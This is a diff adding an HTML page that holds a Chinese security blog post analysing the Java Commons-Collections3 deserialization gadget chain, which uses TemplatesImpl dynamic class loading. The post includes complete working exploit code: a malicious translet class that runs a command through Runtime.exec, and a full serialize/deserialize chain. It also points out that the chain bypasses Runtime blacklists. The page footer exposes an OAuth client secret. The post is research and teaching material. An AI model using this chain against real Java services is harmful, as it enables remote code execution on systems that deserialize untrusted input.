@@ -1,0 +1,397 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Commons-Collections3 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Commons-Collections3 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+CC1和CC6都是用Runtime.exec()命令调用来执行命令。CC3、CC2、CC4这几个都是用的动态类加载来执行代码，动态类加载可以看之前发的文章:  Java动态类加载
+漏洞分析
+使用动态类加载来执行代码，就需要用到defi..." />
+    <meta name="keywords" content="Java,反序列化,Commons-Collections" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Commons-Collections3
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-14
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://le1a.github.io/tag/aOuH92_N0LX/" class="post-tag">
+                  # Commons-Collections
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>CC1和CC6都是用<code>Runtime.exec()</code>命令调用来执行命令。CC3、CC2、CC4这几个都是用的动态类加载来执行代码，动态类加载可以看之前发的文章:  <a href="https://www.le1a.com/posts/9d41d3f8/">Java动态类加载</a></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>使用动态类加载来执行代码，就需要用到<code>defineClass</code>类来处理字节码，将其处理为真正的Java类。但由于<code>ClassLoader</code>类里的<code>defineClass</code>都是protected属性，所以需要找到重写<code>defineClass</code>类，且为public属性的地方。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/def540ef3d08b.png" alt="1647240888733.png" loading="lazy"></figure>
+<p>这里没有注明属性，所以默认为default类型，那么只能在他的这个包底下才能访问。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/def540ef3d08b.png" alt="1647240888733.png" loading="lazy"></figure>
+<p>然后接下来看看哪里调用了这里的<code>defineClass</code>类</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/299f120a3ad03.png" alt="1647243306255.png" loading="lazy"></figure>
+<p>这里<code>TemplatesImpl</code>类的<code>defineTransletClass</code>方法调用了，但是它是private属性，继续查找谁调用了这里的<code>defineTransletClass</code>方法</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/ba4b3312f4165.png" alt="1647243417520.png" loading="lazy"></figure>
+<p>这里找到了<code>getTransletInstance()</code>方法，这个方法有一个初始化的操作，所以只要走完这个函数，就能动态执行我们的代码了，这个方法同样是私有的，所以我们继续向上查找</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/e668dd98c0a10.png" alt="1647250168570.png" loading="lazy"></figure>
+<p>在同一个类下，找到了<code>newTransformer()</code>方法调用了<code>getTransletInstance()</code>方法<img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/9993f48e6100a.png" alt="1647264817034.png" loading="lazy"></p>
+<p>只要调用了<code>newTransformer()</code>方法就会调用<code>getTransletInstance()</code>方法，然后就会触发<code>_class[_transletIndex]</code>类的对象初始化</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/e651154aac98a.png" alt="1647265243514.png" loading="lazy"></figure>
+<p>而这个类的赋值是在上面if语句里的<code>defineTransletClass()</code>方法里进行的，这里对<code>_class[i]</code>进行类加载</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/46ce736910413.png" alt="1647265333301.png" loading="lazy"></figure>
+<p>这里新建一个CC3Test，看一下能否执行代码，看一下TemplatesImpl类。</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/6f6ad47ea92c2.png" alt="1647265635447.png" loading="lazy"></figure>
+<p>这里继承了两个接口，分别是Templates和Serializable，有了Serializable接口，也就能序列化了。</p>
+<p>我们跟进到<code>getTransletInstance()</code>函数里，这里的<code>_name</code>需要赋值，否正会返回null</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/483475662b7ff.png" alt="1647266070738.png" loading="lazy"></figure>
+<p>跟进到构造函数里，发现调用的无参构造啥也没干，所以我们需要给<code>_name</code>赋值，其次如果<code>_class</code>为空的话，会调用<code>defineTransletClasses()</code>，这正是我们希望调用的，所以<code>_class</code>不能赋值，接着我们跟进一下<code>defineTransletClasses()</code></p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/1c23ed85ef58a.png" alt="1647266467722.png" loading="lazy"></figure>
+<p>这里如果<code>_bytecodes</code>为空的话，就会抛出异常了，所以<code>_bytecodes</code>也需要赋值。然后下面需要调用<code>_tfactory</code>的<code>getExternalExtensionsMap()</code>方法，所以<code>_tfactory</code>也需要赋值</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/9bbbd8b0cf18f.png" alt="1647267418739.png" loading="lazy"></figure>
+<p>接下来就差<code>_tfactory</code>的赋值了，我们跟进后发现这是一个<code>transient</code>修饰的变量，是不可被序列化的，所以现在需要看readobject</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/838336c059635.png" alt="1647267470056.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/8550d8950ad13.png" alt="1647267606596.png" loading="lazy"></figure>
+<p>可以看到readObject里面是对_tfactory赋值了的，所以我们这里同样传入一个<code>new TransformerFactoryImpl()</code>。</p>
+<pre><code class="language-java">Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+tfactoryField.setAccessible(true);
+tfactoryField.set(templates,new TransformerFactoryImpl());
+</code></pre>
+<p>然后尝试运行一下，发现报了一个空指针的错误。</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/5e47dd4170296.png" alt="1647271342299.png" loading="lazy"></figure>
+<p>查看<code>defineTransletClasses()</code>，下断点调试一下</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/efc6ca17a74e2.png" alt="1647269866431.png" loading="lazy"></figure>
+<p>最后发现这里的<code>_auxClasses</code>是空的，原因是因为对这个传入的<code>恶意字节码</code>的父类名是不是<code>ABSTRACT_TRANSLET</code>，如果不是的话，就会调用<code>_auxClasses</code>的put方法</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/a31250f7fde5f.png" alt="1647271481418.png" loading="lazy"></figure>
+<p>所以能想到的解决方法:</p>
+<ol>
+<li>让这个类的父类名为ABSTRACT_TRANSLET</li>
+<li>给<code>_auxClasses</code>赋一个值</li>
+</ol>
+<p>但是下面<code>_transletIndex &lt; 0</code>的话，就抛出异常跳出去了，而此时的<code>_transletIndex</code>正是<code>-1</code>，所以只能采取第一种方法，让恶意类继承这个<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/33142185011fa.png" alt="1647271910048.png" loading="lazy"></figure>
+<pre><code class="language-java">package ClassLoader;
+
+import java.lang.reflect.Method;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Hacker extends AbstractTranslet{
+    public Hacker() throws Exception {
+        Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);
+        Method getruntime = runtime.getMethod(&quot;getRuntime&quot;);
+        Object r = getruntime.invoke(runtime);
+        exec.invoke(r,&quot;calc&quot;);
+        System.out.println(&quot;Hacker！！！&quot;);
+    }
+
+    public static void main(String[] args) {}
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/884b7f82eb14c.png" alt="1647272088758.png" loading="lazy"></figure>
+<p>所以只要调用了<code>TemplatesImpl#newTransformer()</code>，就可以执行任意代码。因为这个用到了<code>newTransformer()</code>，所以可以直接用到CC1的<code>InvokerTransformer()</code>来调用<code>newTransformer()</code></p>
+<pre><code class="language-java">Transformer[] transformers = new Transformer[]{
+        new ConstantTransformer(templates),
+        new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+};
+
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/2f97d4e1bc322.png" alt="1647272378375.png" loading="lazy"></figure>
+<p>成功执行代码，其实相比CC1来说，只改了后半部分执行命令的方式。CC1是利用<code>InvokerTransformer()</code>调用Runtime#exec()，而CC3是利用<code>InvokerTransformer()</code>调用<code>newTransformer()</code>，实现动态类加载，执行我们传入的恶意类的代码。所以直接照搬后半部分就可以了。</p>
+<pre><code class="language-java">package CC.CC3;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3Test {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class tc = templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);//给_name变量赋值
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);//给_bytecodes赋值
+        bytecodesField.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Code\\out\\production\\Code\\ClassLoader\\Hacker.class&quot;));
+        byte[][] codes = {code};  //正常defineClass是传入一个一维数组，这里会进入for循环进行一个循环调用来进行defineClass类加载，我们只需要一个就行
+        bytecodesField.set(templates,codes);//这里是传入一个二维数组
+
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;value&quot;,&quot;aaa&quot;);
+        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
+        annotationInvocationhdlConstructor.setAccessible(true);
+        Object o = annotationInvocationhdlConstructor.newInstance(Target.class,transformedMap);
+        serialize(o);
+        unserialize(&quot;ser.bin&quot;);
+
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/d6ea7be9c0434.png" alt="1647272538346.png" loading="lazy"></figure>
+<p>成功执行代码，所以当过滤了Runtime类的时候，可以使用CC3来绕过黑名单。下面是流程示意图！</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/14/d0cc55e422543.png" alt="1647272759464.png" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Java动态类加载/">
+              <h3 class="post-title">
+                Java动态类加载
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
